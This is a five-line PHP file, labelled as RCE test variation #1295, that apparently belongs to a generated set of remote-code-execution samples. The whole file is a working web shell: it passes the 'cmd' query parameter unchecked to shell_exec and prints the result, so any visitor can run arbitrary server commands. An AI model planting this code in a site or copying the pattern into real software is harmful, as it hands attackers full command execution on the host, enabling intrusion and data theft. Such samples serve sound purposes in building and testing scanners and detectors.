<?php
// RCE test variation #1295
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>